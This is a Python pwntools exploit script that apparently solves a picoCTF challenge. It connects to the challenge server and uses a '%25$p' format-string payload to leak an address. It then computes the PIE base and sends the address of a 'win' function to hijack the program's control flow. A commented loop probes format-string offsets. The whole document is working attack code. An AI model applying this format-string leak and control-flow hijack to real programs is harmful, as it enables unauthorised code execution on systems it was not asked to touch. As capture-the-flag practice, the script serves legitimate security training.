from pwn import *

context.binary = elf = ELF("./vuln")
context.terminal = ['wt.exe','wsl.exe']
context.log_level = 'error'
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        p = gdb.debug([elf.path],'''
            b *main
            continue
        ''')
else:
    #p = process()
    p = remote('rescued-float.picoctf.net',59162)

# for i in range(100):
#     # p = remote('rescued-float.picoctf.net',59162)
#     p = process()
#     payload = f'%{i}$p'.encode()
#     p.sendline(payload)
#     p.recvuntil(b'name:')
#     a = p.recvline().strip()
#     print(i,a)
#     p.close()
payload = f'%25$p'.encode()
p.sendline(payload)
p.recvuntil(b'name:')
a = p.recvline().strip()
elf.address = eval(a) - 0x1400
print(f'pie @ {hex(elf.address)}')
p.sendline(hex(elf.sym.win))
p.interactive()